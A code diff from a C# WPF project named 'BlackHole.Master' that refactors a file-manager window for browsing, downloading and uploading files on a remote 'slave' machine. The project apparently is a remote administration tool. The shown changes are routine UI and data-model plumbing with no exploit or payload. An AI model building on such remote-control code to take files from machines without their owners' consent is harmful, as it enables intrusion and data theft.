@@ -8,6 +8,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
+using System.Windows.Media;
 
 namespace BlackHole.Master
 {
@@ -28,7 +29,7 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
-        public ViewModel<FileDownload> ViewModelDownloads
+        public ViewModel<FileTransaction> ViewModelDownloads
         {
             get;
             private set;
@@ -37,18 +38,11 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
-        public int SlaveId
+        public Slave Slave
         {
-            get
-            {
-                return m_slave.Id;
-            }
+            get;
+            private set;
         }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        private Slave m_slave;
 
         /// <summary>
         /// 
@@ -61,11 +55,11 @@ namespace BlackHole.Master
         /// <param name="slave"></param>
         public FileManager(Slave slave) : this()
         {
-            m_slave = slave;
+            Slave = slave;
 
             TargetStatusBar.DataContext = slave;
 
-            DownloadsList.DataContext = ViewModelDownloads = new ViewModel<FileDownload>();
+            DownloadsList.DataContext = ViewModelDownloads = new ViewModel<FileTransaction>();
             FilesList.DataContext = ViewModelFiles = new ViewModel<FileMeta>();
         }
 
@@ -75,7 +69,7 @@ namespace BlackHole.Master
         /// <param name="folder"></param>
         private void NavigateToFolder(string folder)
         {
-            m_slave.Send(new NavigateToFolderMessage()
+            this.Send(new NavigateToFolderMessage()
             {
                 Path = Path.Combine(TxtBoxDirectory.Text, folder)
             });
@@ -87,7 +81,7 @@ namespace BlackHole.Master
         /// <param name="path"></param>
         private void DownloadFile(string name)
         {
-            m_slave.Send(new DownloadFilePartMessage()
+            this.Send(new DownloadFilePartMessage()
             {
                 Id = m_nextDownloadId++,
                 CurrentPart = 0,
@@ -124,49 +118,106 @@ namespace BlackHole.Master
                                 TargetStatus.Content = m.Operation;
                                 TargetStatusTooltipTitle.Text = m.Operation;
                                 TargetStatusTooltipMessage.Text = m.Message;
-                                if (!m.Success)
-                                {
-                                    TargetStatusTooltip.PlacementTarget = TargetStatus;
-                                    TargetStatusTooltip.IsOpen = true;
-                                    Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(4000), () =>
-                                    {
-                                        TargetStatusTooltip.IsOpen = false;
-                                    });
-                                }
+                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
+                                TargetStatusTooltip.PlacementTarget = TargetStatus;
+                                TargetStatusTooltip.IsOpen = true;
                             })
                             .With<DownloadedFilePartMessage>(m =>
                             {
-                                var model = ViewModelDownloads.Items.FirstOrDefault(mod => mod.Id == m.Id);
-                                if (model == null)
-                                {
-                                    model = new FileDownload(m.Id, m.Path);
-                                    ViewModelDownloads.Items.Add(model);
-                                }
-
-                                model.OnPartDownloaded(m);
-
-                                if(model.DownloadCompleted)
-                                {
-                                    m_slave.SaveDownloadedFile(model.Name, model.RawFile.ToArray());
-                                    Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () =>
+                                UpdateFileTransaction<FileDownload>(m,
+                                    (download) =>
                                     {
-                                        ViewModelDownloads.Items.Remove(model);
-                                    });
-                                }
-                                else
-                                {
-                                    // get the next chunck
-                                    m_slave.Send(new DownloadFilePartMessage()
+                                        var raw = download.RawFile.ToArray();
+                                        Slave.SaveDownloadedFile(download.Name, raw);
+                                        Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_DOWNLOADED, Slave, raw));
+                                    },
+                                    (download) => this.Send(new DownloadFilePartMessage()
                                     {
-                                        Id = model.Id,
-                                        Path = model.FilePath,
+                                        Id = download.Id,
+                                        Path = download.FilePath,
                                         CurrentPart = m.CurrentPart + 1
+                                    }));
+                            })
+                            .With<DownloadFilePartMessage>(m =>
+                            {
+                                Utility.ExecuteComplexOperation("File upload", 
+                                    () => CommonHelper.DownloadFilePart(m.Id, m.CurrentPart, m.Path),
+                                    (part) => 
+                                    {
+                                        UpdateFileTransaction<FileUpload>(part,
+                                            (upload) =>
+                                            {
+                                                Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_UPLOADED, Slave, upload.FilePath));
+                                            },
+                                            (upload) => this.Send(part));                                        
+                                    },
+                                    (e) =>
+                                    {
+                                        Slave.SlaveEvents.PostEvent(
+                                            new SlaveEvent(
+                                                SlaveEventType.INCOMMING_MESSAGE,
+                                                Slave,
+                                                new StatusUpdateMessage()
+                                                {
+                                                    Operation = "File upload",
+                                                    Success = false,
+                                                    Message = e.Message
+                                                }));
                                     });
-                                }
                             });                        
                         break;
                 }
             });
         }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="part"></param>
+        private void UpdateFileTransaction<T>(DownloadedFilePartMessage part, Action<T> onCompleted, Action<T> onContinue)
+            where T : FileTransaction, new()
+        {
+            var model = FindOrCreateFileTransaction<T>(part);
+            if (model.Completed)
+            {
+                onCompleted(model);
+                Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () =>
+                {
+                    ViewModelDownloads.Items.Remove(model);
+                });
+            }
+            else
+                onContinue(model);
+        }
+            
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="part"></param>
+        /// <returns></returns>
+        private T FindOrCreateFileTransaction<T>(DownloadedFilePartMessage part)
+            where T : FileTransaction, new()
+        {
+            var model = FindFileTransaction<T>(part);
+            if (model == null)
+            {
+                model = new T();
+                model.Id = part.Id;
+                model.FilePath = part.Path;
+                ViewModelDownloads.Items.Add(model);
+            }
+            model.OnPartDownloaded(part);
+            return model;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="id"></param>
+        /// <returns></returns>
+        private T FindFileTransaction<T>(DownloadedFilePartMessage part)
+            where T : FileTransaction
+            => ViewModelDownloads.Items.OfType<T>().FirstOrDefault(mod => mod.Id == part.Id);
     }
 }
